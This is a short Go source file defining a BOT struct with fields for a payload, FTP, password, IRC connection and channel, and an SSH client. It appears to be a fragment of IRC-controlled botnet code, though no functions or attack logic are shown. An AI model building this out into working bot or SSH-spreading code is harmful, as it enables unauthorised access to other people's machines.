package pkg

import (
	"net"

	"golang.org/x/crypto/ssh"
)

type BOT struct {
	cpu               int
	payload           string
	ftp               string
	password, network string
	Channel, ChanKey  string
	IRC               net.Conn
	session           *ssh.Client
}
